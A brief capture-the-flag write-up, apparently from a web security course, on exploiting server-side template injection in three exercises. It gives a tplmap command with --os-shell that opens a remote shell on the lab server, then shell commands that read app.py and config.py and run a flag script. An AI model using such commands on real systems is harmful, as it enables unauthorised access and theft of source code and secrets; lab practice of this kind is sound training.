
  

#  STTI

  

####  For understanding SSTI (Server Side Template Injection), I googled it and find this page. 
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
#### Then I checked on github if I can find a tool that find and use vulnerabilities.
https://github.com/epinna/tplmap
For the tree exercises, I use a single command that create a remote web shell.

```console
python3 tplmap.py -u 'https://ssti1.secu-web.blackfoot.dev/?username=47' --os-shell
```
When the shell was set and ready to execute command, I started with ```ls```.

  

##  STI 1
```cat app.py```.
  

##  STI 2
```cat config.py```.
  

##  STI 3
```./getFlag.py```.